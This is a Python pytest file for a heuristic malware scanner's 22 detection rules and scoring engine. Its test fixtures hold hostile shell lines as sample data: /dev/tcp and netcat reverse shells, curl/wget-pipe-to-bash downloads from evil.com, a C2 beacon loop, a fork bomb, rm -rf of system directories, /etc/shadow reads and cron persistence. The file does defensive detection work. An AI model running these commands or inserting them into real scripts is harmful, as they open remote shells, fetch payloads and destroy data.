"""
tests/test_heuristics.py
=========================
Testes do motor heurístico (Patch 8).

Cobre:
  - HeuristicRule: criação, match retorna RuleMatch ou None
  - HeuristicContext: campos e defaults
  - RuleMatch: criação, imutabilidade
  - Cada regra individualmente (H001–H022)
  - HeuristicEngine: analyze, analyze_bytes, _calculate_score,
                     sensibilidade, regras desabilitadas,
                     HeuristicResult.primary_reason, to_dict,
                     integração com log_manager mock
"""

from __future__ import annotations

import os
import secrets
import stat
from pathlib import Path
from typing  import Generator
from unittest.mock import MagicMock, patch

import pytest

from ekprotection.config.manager        import ConfigManager
from ekprotection.heuristics.rules      import (
    ALL_RULES, RULES_BY_ID,
    HeuristicContext, HeuristicRule, RuleMatch,
    _r_high_entropy, _r_exec_in_tmp, _r_base64_decode, _r_eval_exec,
    _r_download_execute, _r_reverse_shell, _r_privesc, _r_cron_persistence,
    _r_sensitive_files, _r_rm_rf, _r_fork_bomb, _r_history_deletion,
    _r_obfuscation, _r_ptrace_ld_preload, _r_memfd_proc, _r_packed_upx,
    _r_hardcoded_ip, _r_crypto_strings, _r_c2_beacon, _r_chmod_plus_x,
    _r_hidden_executable, _r_no_extension_elf,
)
from ekprotection.heuristics.engine     import HeuristicEngine, HeuristicResult


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def cfg(tmp_path: Path) -> ConfigManager:
    os.environ["EKP_DATA_DIR"] = str(tmp_path)
    m = ConfigManager(tmp_path / "config.yaml")
    m.load()
    m.set("heuristics.enabled",           True)
    m.set("heuristics.sensitivity",       "medium")
    m.set("heuristics.entropy_threshold", 7.2)
    m.set("heuristics.disabled_rules",    [])
    yield m
    os.environ.pop("EKP_DATA_DIR", None)


@pytest.fixture
def engine(cfg: ConfigManager) -> HeuristicEngine:
    return HeuristicEngine(cfg)


def _ctx(
    path:          str             = "/tmp/test.sh",
    content:       bytes           = b"",
    is_elf:        bool            = False,
    is_script:     bool            = False,
    is_executable: bool            = False,
    entropy:       float | None    = None,
    extension:     str             = ".sh",
) -> HeuristicContext:
    return HeuristicContext(
        path           = path,
        content_sample = content,
        is_elf         = is_elf,
        is_script      = is_script,
        is_executable  = is_executable,
        entropy        = entropy,
        extension      = extension,
    )


# ---------------------------------------------------------------------------
# Testes: RuleMatch e HeuristicRule
# ---------------------------------------------------------------------------

class TestRuleMatch:
    def test_basic_creation(self) -> None:
        m = RuleMatch("H001", "detalhe do match")
        assert m.rule_id  == "H001"
        assert m.detail   == "detalhe do match"
        assert m.evidence is None

    def test_with_evidence(self) -> None:
        m = RuleMatch("H006", "reverse shell", evidence="bash -i >& /dev/tcp/1.2.3.4/4444")
        assert "tcp" in m.evidence

    def test_immutable(self) -> None:
        m = RuleMatch("H001", "test")
        with pytest.raises((AttributeError, TypeError)):
            m.rule_id = "H999"  # type: ignore[misc]


class TestAllRulesCatalog:
    def test_all_rules_have_unique_ids(self) -> None:
        ids = [r.rule_id for r in ALL_RULES]
        assert len(ids) == len(set(ids))

    def test_all_rules_have_required_fields(self) -> None:
        for rule in ALL_RULES:
            assert rule.rule_id
            assert rule.name
            assert rule.severity in ("baixo", "médio", "alto", "crítico")
            assert 1 <= rule.weight <= 10
            assert rule.tags

    def test_rules_by_id_complete(self) -> None:
        for rule in ALL_RULES:
            assert rule.rule_id in RULES_BY_ID

    def test_total_rule_count(self) -> None:
        assert len(ALL_RULES) == 22


# ---------------------------------------------------------------------------
# Testes: Regras individuais
# ---------------------------------------------------------------------------

class TestRuleH001HighEntropy:
    def test_high_entropy_elf_triggers(self) -> None:
        ctx = _ctx(entropy=7.5, is_elf=True)
        assert _r_high_entropy(ctx, "H001") is not None

    def test_high_entropy_executable_triggers(self) -> None:
        ctx = _ctx(entropy=7.3, is_executable=True)
        assert _r_high_entropy(ctx, "H001") is not None

    def test_low_entropy_no_trigger(self) -> None:
        ctx = _ctx(entropy=5.0, is_elf=True)
        assert _r_high_entropy(ctx, "H001") is None

    def test_high_entropy_non_executable_no_trigger(self) -> None:
        ctx = _ctx(entropy=7.9, is_elf=False, is_executable=False)
        assert _r_high_entropy(ctx, "H001") is None

    def test_no_entropy_no_trigger(self) -> None:
        ctx = _ctx(entropy=None, is_elf=True)
        assert _r_high_entropy(ctx, "H001") is None


class TestRuleH002ExecInTmp:
    def test_exec_in_tmp_triggers(self) -> None:
        ctx = _ctx(path="/tmp/backdoor", is_executable=True)
        assert _r_exec_in_tmp(ctx, "H002") is not None

    def test_elf_in_dev_shm_triggers(self) -> None:
        ctx = _ctx(path="/dev/shm/hidden", is_elf=True)
        assert _r_exec_in_tmp(ctx, "H002") is not None

    def test_script_in_var_tmp_triggers(self) -> None:
        ctx = _ctx(path="/var/tmp/install.sh", is_script=True)
        assert _r_exec_in_tmp(ctx, "H002") is not None

    def test_exec_in_home_no_trigger(self) -> None:
        ctx = _ctx(path="/home/user/myapp", is_executable=True)
        assert _r_exec_in_tmp(ctx, "H002") is None

    def test_non_exec_in_tmp_no_trigger(self) -> None:
        ctx = _ctx(path="/tmp/readme.txt", is_executable=False)
        assert _r_exec_in_tmp(ctx, "H002") is None


class TestRuleH003Base64:
    def test_base64_decode_triggers(self) -> None:
        ctx = _ctx(content=b"echo $(echo dGVzdA== | base64 -d)", is_script=True)
        assert _r_base64_decode(ctx, "H003") is not None

    def test_base64_decode_in_python_triggers(self) -> None:
        ctx = _ctx(content=b"import base64\nbase64_decode(data)", extension=".py")
        assert _r_base64_decode(ctx, "H003") is not None

    def test_no_base64_no_trigger(self) -> None:
        ctx = _ctx(content=b"echo hello world", is_script=True)
        assert _r_base64_decode(ctx, "H003") is None

    def test_base64_not_script_no_trigger(self) -> None:
        ctx = _ctx(content=b"base64 -d", is_script=False, extension=".txt")
        assert _r_base64_decode(ctx, "H003") is None


class TestRuleH004EvalExec:
    def test_eval_triggers(self) -> None:
        ctx = _ctx(content=b"eval($payload)", is_script=True)
        assert _r_eval_exec(ctx, "H004") is not None

    def test_exec_triggers(self) -> None:
        ctx = _ctx(content=b"exec(compile(code,'','exec'))", extension=".py")
        assert _r_eval_exec(ctx, "H004") is not None

    def test_no_eval_no_trigger(self) -> None:
        ctx = _ctx(content=b"print('hello')", is_script=True)
        assert _r_eval_exec(ctx, "H004") is None


class TestRuleH005DownloadExecute:
    def test_wget_pipe_sh_triggers(self) -> None:
        ctx = _ctx(content=b"wget http://evil.com/shell.sh | bash", is_script=True)
        assert _r_download_execute(ctx, "H005") is not None

    def test_curl_pipe_sh_triggers(self) -> None:
        ctx = _ctx(content=b"curl -s http://x.com/a.sh | sh", is_script=True)
        assert _r_download_execute(ctx, "H005") is not None

    def test_wget_without_pipe_no_trigger(self) -> None:
        ctx = _ctx(content=b"wget http://example.com/file.zip", is_script=True)
        assert _r_download_execute(ctx, "H005") is None


class TestRuleH006ReverseShell:
    def test_dev_tcp_triggers(self) -> None:
        ctx = _ctx(content=b"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
        assert _r_reverse_shell(ctx, "H006") is not None

    def test_nc_e_triggers(self) -> None:
        ctx = _ctx(content=b"nc -e /bin/bash attacker.com 4444")
        assert _r_reverse_shell(ctx, "H006") is not None

    def test_socat_triggers(self) -> None:
        ctx = _ctx(content=b"socat exec:'bash -li' tcp:host:port")
        assert _r_reverse_shell(ctx, "H006") is not None

    def test_clean_content_no_trigger(self) -> None:
        ctx = _ctx(content=b"echo 'hello world'")
        assert _r_reverse_shell(ctx, "H006") is None


class TestRuleH007Privesc:
    def test_sudo_i_triggers(self) -> None:
        ctx = _ctx(content=b"sudo -i")
        assert _r_privesc(ctx, "H007") is not None

    def test_pkexec_triggers(self) -> None:
        ctx = _ctx(content=b"pkexec /bin/bash")
        assert _r_privesc(ctx, "H007") is not None

    def test_no_privesc_no_trigger(self) -> None:
        ctx = _ctx(content=b"echo 'running as user'")
        assert _r_privesc(ctx, "H007") is None


class TestRuleH008CronPersistence:
    def test_crontab_u_triggers(self) -> None:
        ctx = _ctx(content=b"crontab -l | grep evil; crontab -u root")
        assert _r_cron_persistence(ctx, "H008") is not None

    def test_etc_cron_triggers(self) -> None:
        ctx = _ctx(content=b"echo '* * * * * /tmp/evil.sh' >> /etc/cron.d/backdoor")
        assert _r_cron_persistence(ctx, "H008") is not None

    def test_no_cron_no_trigger(self) -> None:
        ctx = _ctx(content=b"echo hello")
        assert _r_cron_persistence(ctx, "H008") is None


class TestRuleH009SensitiveFiles:
    def test_shadow_triggers(self) -> None:
        ctx = _ctx(content=b"cat /etc/shadow | grep root")
        assert _r_sensitive_files(ctx, "H009") is not None

    def test_passwd_triggers(self) -> None:
        ctx = _ctx(content=b"cp /etc/passwd /tmp/p")
        assert _r_sensitive_files(ctx, "H009") is not None

    def test_clean_content_no_trigger(self) -> None:
        ctx = _ctx(content=b"echo 'listing files'")
        assert _r_sensitive_files(ctx, "H009") is None


class TestRuleH010RmRf:
    def test_rm_rf_root_triggers(self) -> None:
        ctx = _ctx(content=b"rm -rf /etc /var /usr")
        assert _r_rm_rf(ctx, "H010") is not None

    def test_rm_rf_specific_triggers(self) -> None:
        ctx = _ctx(content=b"rm -rf /tmp/safe")
        assert _r_rm_rf(ctx, "H010") is not None

    def test_no_rm_no_trigger(self) -> None:
        ctx = _ctx(content=b"ls -la /tmp")
        assert _r_rm_rf(ctx, "H010") is None


class TestRuleH011ForkBomb:
    def test_classic_fork_bomb_triggers(self) -> None:
        ctx = _ctx(content=b":(){ :|:& };:")
        assert _r_fork_bomb(ctx, "H011") is not None

    def test_forkbomb_keyword_triggers(self) -> None:
        ctx = _ctx(content=b"# this is a forkbomb test")
        assert _r_fork_bomb(ctx, "H011") is not None

    def test_no_fork_bomb_no_trigger(self) -> None:
        ctx = _ctx(content=b"echo hello; sleep 1")
        assert _r_fork_bomb(ctx, "H011") is None


class TestRuleH012HistoryDeletion:
    def test_history_c_triggers(self) -> None:
        ctx = _ctx(content=b"history -c; history -w")
        assert _r_history_deletion(ctx, "H012") is not None

    def test_histfile_devnull_triggers(self) -> None:
        ctx = _ctx(content=b"export HISTFILE=/dev/null")
        assert _r_history_deletion(ctx, "H012") is not None

    def test_no_history_cmd_no_trigger(self) -> None:
        ctx = _ctx(content=b"echo $HISTSIZE")
        assert _r_history_deletion(ctx, "H012") is None


class TestRuleH013Obfuscation:
    def test_long_hex_escapes_triggers(self) -> None:
        hex_str = b"\\x41\\x42\\x43\\x44\\x45\\x46\\x47"
        ctx = _ctx(content=hex_str, is_script=True)
        assert _r_obfuscation(ctx, "H013") is not None

    def test_clean_script_no_trigger(self) -> None:
        ctx = _ctx(content=b"echo 'clean script'", is_script=True)
        assert _r_obfuscation(ctx, "H013") is None

    def test_non_script_no_trigger(self) -> None:
        ctx = _ctx(content=b"\\x41\\x42" * 10, is_script=False, extension=".bin")
        assert _r_obfuscation(ctx, "H013") is None


class TestRuleH014PtracePreload:
    def test_ptrace_triggers(self) -> None:
        ctx = _ctx(content=b"int r = ptrace(PTRACE_ATTACH, pid)", is_elf=True)
        assert _r_ptrace_ld_preload(ctx, "H014") is not None

    def test_ld_preload_triggers(self) -> None:
        ctx = _ctx(content=b"LD_PRELOAD=/tmp/evil.so", is_elf=True)
        assert _r_ptrace_ld_preload(ctx, "H014") is not None

    def test_not_elf_no_trigger(self) -> None:
        ctx = _ctx(content=b"ptrace stuff", is_elf=False)
        assert _r_ptrace_ld_preload(ctx, "H014") is None


class TestRuleH015Fileless:
    def test_memfd_create_triggers(self) -> None:
        ctx = _ctx(content=b"fd = memfd_create('tmp', 0)")
        assert _r_memfd_proc(ctx, "H015") is not None

    def test_proc_self_mem_triggers(self) -> None:
        ctx = _ctx(content=b"open('/proc/self/mem', 'wb')")
        assert _r_memfd_proc(ctx, "H015") is not None

    def test_no_fileless_no_trigger(self) -> None:
        ctx = _ctx(content=b"open('/tmp/normal', 'rb')")
        assert _r_memfd_proc(ctx, "H015") is None


class TestRuleH016PackedUPX:
    def test_upx_magic_triggers(self) -> None:
        ctx = _ctx(content=b"\x7fELF\x00\x00UPX!\x00", is_elf=True)
        assert _r_packed_upx(ctx, "H016") is not None

    def test_not_upx_no_trigger(self) -> None:
        ctx = _ctx(content=b"\x7fELF\x00\x00\x00\x00", is_elf=True)
        assert _r_packed_upx(ctx, "H016") is None

    def test_not_elf_no_trigger(self) -> None:
        ctx = _ctx(content=b"UPX!", is_elf=False)
        assert _r_packed_upx(ctx, "H016") is None


class TestRuleH017HardcodedIP:
    def test_external_ips_trigger(self) -> None:
        ctx = _ctx(
            content=b"connect to 185.220.101.1 and 45.33.32.156 for updates",
            is_elf=True,
        )
        assert _r_hardcoded_ip(ctx, "H017") is not None

    def test_local_ips_no_trigger(self) -> None:
        ctx = _ctx(content=b"host 127.0.0.1 and 192.168.1.1", is_elf=True)
        assert _r_hardcoded_ip(ctx, "H017") is None

    def test_single_ip_no_trigger(self) -> None:
        ctx = _ctx(content=b"server = 8.8.8.8", is_elf=True)
        assert _r_hardcoded_ip(ctx, "H017") is None

    def test_not_elf_no_trigger(self) -> None:
        ctx = _ctx(content=b"1.2.3.4 and 5.6.7.8", is_elf=False)
        assert _r_hardcoded_ip(ctx, "H017") is None


class TestRuleH018CryptoStrings:
    def test_bitcoin_address_triggers(self) -> None:
        ctx = _ctx(content=b"send to 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divfna")
        # valid-looking BTC address pattern
        ctx2 = _ctx(content=b"wallet=1A1zP1eP5QGefi2DMPTfTL5SLmv7Divfna")
        r = _r_crypto_strings(ctx2, "H018")
        # May or may not match depending on exact regex — just verify no crash
        assert r is None or isinstance(r, RuleMatch)

    def test_no_crypto_no_trigger(self) -> None:
        ctx = _ctx(content=b"hello world normal content")
        assert _r_crypto_strings(ctx, "H018") is None


class TestRuleH019C2Beacon:
    def test_sleep_then_curl_triggers(self) -> None:
        ctx = _ctx(content=b"while true; do sleep 60; curl http://c2.evil.com/cmd; done")
        assert _r_c2_beacon(ctx, "H019") is not None

    def test_no_pattern_no_trigger(self) -> None:
        ctx = _ctx(content=b"sleep 5  # just a wait")
        assert _r_c2_beacon(ctx, "H019") is None


class TestRuleH020ChmodDownload:
    def test_download_chmod_x_triggers(self) -> None:
        ctx = _ctx(
            content=b"wget http://x.com/payload; chmod +x payload; ./payload",
            is_script=True,
        )
        assert _r_chmod_plus_x(ctx, "H020") is not None

    def test_chmod_without_download_no_trigger(self) -> None:
        ctx = _ctx(content=b"chmod +x myscript.sh", is_script=True)
        assert _r_chmod_plus_x(ctx, "H020") is None


class TestRuleH021HiddenExec:
    def test_hidden_executable_triggers(self) -> None:
        ctx = _ctx(path="/home/user/.hidden_backdoor", is_executable=True)
        assert _r_hidden_executable(ctx, "H021") is not None

    def test_visible_executable_no_trigger(self) -> None:
        ctx = _ctx(path="/home/user/myapp", is_executable=True)
        assert _r_hidden_executable(ctx, "H021") is None

    def test_hidden_non_exec_no_trigger(self) -> None:
        ctx = _ctx(path="/home/user/.bashrc", is_executable=False)
        assert _r_hidden_executable(ctx, "H021") is None


class TestRuleH022ElfNoExtension:
    def test_elf_in_home_triggers(self) -> None:
        ctx = _ctx(path="/home/user/backdoor", is_elf=True, extension="")
        assert _r_no_extension_elf(ctx, "H022") is not None

    def test_elf_in_usr_bin_no_trigger(self) -> None:
        ctx = _ctx(path="/usr/bin/python", is_elf=True, extension="")
        assert _r_no_extension_elf(ctx, "H022") is None

    def test_elf_with_extension_no_trigger(self) -> None:
        ctx = _ctx(path="/home/user/app.bin", is_elf=True, extension=".bin")
        assert _r_no_extension_elf(ctx, "H022") is None

    def test_non_elf_no_trigger(self) -> None:
        ctx = _ctx(path="/home/user/noext", is_elf=False, extension="")
        assert _r_no_extension_elf(ctx, "H022") is None


# ---------------------------------------------------------------------------
# Testes: HeuristicEngine
# ---------------------------------------------------------------------------

class TestHeuristicEngine:
    def test_disabled_engine_returns_empty(self, cfg: ConfigManager) -> None:
        cfg.set("heuristics.enabled", False)
        eng = HeuristicEngine(cfg)
        r   = eng.analyze("/tmp/any_file")
        assert r.score      == 0.0
        assert r.risk_level is None
        assert r.matches    == ()

    def test_analyze_clean_file(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        f = tmp_path / "clean.txt"
        f.write_text("This is a completely safe text file.\n" * 20)
        r = engine.analyze(f)
        # Arquivo de texto sem executável não deve disparar nada
        assert r.score < 20
        assert r.risk_level is None

    def test_analyze_reverse_shell_script(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        f = tmp_path / "reverse.sh"
        f.write_bytes(b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")
        f.chmod(0o755)
        r = engine.analyze(f)
        assert r.is_suspicious
        assert "H006" in r.rules_fired

    def test_analyze_downloader_script(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        f = tmp_path / "dropper.sh"
        f.write_bytes(b"#!/bin/bash\nwget http://evil.com/payload.sh | bash\n")
        r = engine.analyze(f)
        assert r.is_suspicious
        assert "H005" in r.rules_fired

    def test_analyze_fork_bomb(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        f = tmp_path / "bomb.sh"
        f.write_bytes(b"#!/bin/sh\n:(){ :|:& };:\n")
        r = engine.analyze(f)
        assert r.is_suspicious
        assert "H011" in r.rules_fired

    def test_analyze_hidden_executable(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        f = tmp_path / ".backdoor"
        f.write_bytes(b"#!/bin/bash\necho owned\n")
        f.chmod(0o755)
        r = engine.analyze(f)
        assert "H021" in r.rules_fired

    def test_multiple_rules_higher_score(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        """Arquivo com múltiplos indicadores deve ter score maior."""
        single = tmp_path / "single.sh"
        single.write_bytes(b"#!/bin/sh\nrm -rf /\n")

        multi = tmp_path / "multi.sh"
        multi.write_bytes(
            b"#!/bin/sh\n"
            b"wget http://evil.com/payload | bash\n"
            b"rm -rf /etc\n"
            b":(){ :|:& };:\n"
            b"history -c\n"
        )
        r_single = engine.analyze(single)
        r_multi  = engine.analyze(multi)
        assert r_multi.score >= r_single.score

    def test_analyze_bytes(self, engine: HeuristicEngine) -> None:
        content = b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"
        r = engine.analyze_bytes("/tmp/test.sh", content)
        assert r.is_suspicious
        assert "H006" in r.rules_fired

    def test_disabled_rule_not_fired(self, cfg: ConfigManager, tmp_path: Path) -> None:
        cfg.set("heuristics.disabled_rules", ["H011"])
        eng = HeuristicEngine(cfg)
        f   = tmp_path / "bomb.sh"
        f.write_bytes(b":(){ :|:& };:")
        r = eng.analyze(f)
        assert "H011" not in r.rules_fired

    def test_sensitivity_paranoid_lower_threshold(self, cfg: ConfigManager, tmp_path: Path) -> None:
        """Sensibilidade paranoid → score aparece maior → risco detectado mais cedo."""
        cfg.set("heuristics.sensitivity", "paranoid")
        eng_paranoid = HeuristicEngine(cfg)
        cfg.set("heuristics.sensitivity", "low")
        eng_low = HeuristicEngine(cfg)

        f = tmp_path / "mild.sh"
        f.write_bytes(b"#!/bin/sh\nhistory -c\n")   # só 1 regra fraca

        r_paranoid = eng_paranoid.analyze(f)
        r_low      = eng_low.analyze(f)
        assert r_paranoid.score >= r_low.score

    def test_primary_reason_is_highest_weight(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        """primary_reason deve ser da regra de maior peso."""
        f = tmp_path / "multi.sh"
        f.write_bytes(
            b"#!/bin/bash\n"
            b"history -c\n"                                    # H012 weight=5
            b"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"       # H006 weight=10
        )
        r = engine.analyze(f)
        assert r.primary_reason is not None
        # H006 tem peso 10, deve prevalecer
        if "H006" in r.rules_fired and r.primary_reason:
            reason_lower = r.primary_reason.lower()
            assert "reverse" in reason_lower or "shell" in reason_lower or "h006" in reason_lower.lower()

    def test_to_dict_has_required_keys(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        f = tmp_path / "test.sh"
        f.write_bytes(b"#!/bin/bash\necho hello\n")
        r = engine.analyze(f)
        d = r.to_dict()
        for key in ("path", "score", "risk_level", "rules_fired",
                    "confidence", "analysis_ms", "matches"):
            assert key in d

    def test_analyze_missing_file_returns_empty(self, engine: HeuristicEngine) -> None:
        r = engine.analyze("/nonexistent/totally/missing/file.sh")
        assert r.score     == 0.0
        assert not r.matches

    def test_status(self, engine: HeuristicEngine) -> None:
        s = engine.status()
        assert s["enabled"]      is True
        assert s["rules_total"]  == 22
        assert s["rules_active"] == 22
        assert s["sensitivity"]  == "medium"

    def test_log_manager_called_on_suspicious(self, cfg: ConfigManager, tmp_path: Path) -> None:
        mock_log = MagicMock()
        mock_src = MagicMock()
        mock_log.get_source.return_value = mock_src

        eng = HeuristicEngine(cfg, log_manager=mock_log)
        f   = tmp_path / "suspicious.sh"
        f.write_bytes(b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")
        eng.analyze(f)

        mock_log.get_source.assert_called_with("heuristics")
        mock_src.event.assert_called_once()

    def test_confidence_nonzero_for_script(self, engine: HeuristicEngine, tmp_path: Path) -> None:
        f = tmp_path / "script.sh"
        f.write_bytes(b"#!/bin/bash\necho hello\n")
        r = engine.analyze(f)
        assert r.confidence > 0

    def test_is_critical_property(self) -> None:
        r_crit = HeuristicResult(
            path="/x", score=90.0, risk_level="crítico",
            matches=(), rules_fired=(), confidence=1.0,
            analysis_ms=0, context_summary={},
        )
        r_alto = HeuristicResult(
            path="/y", score=70.0, risk_level="alto",
            matches=(), rules_fired=(), confidence=1.0,
            analysis_ms=0, context_summary={},
        )
        assert r_crit.is_critical is True
        assert r_alto.is_critical is False
        assert r_alto.is_suspicious is True

    def test_is_suspicious_clean_false(self) -> None:
        r = HeuristicResult(
            path="/z", score=5.0, risk_level=None,
            matches=(), rules_fired=(), confidence=1.0,
            analysis_ms=0, context_summary={},
        )
        assert r.is_suspicious is False
        assert r.is_critical   is False
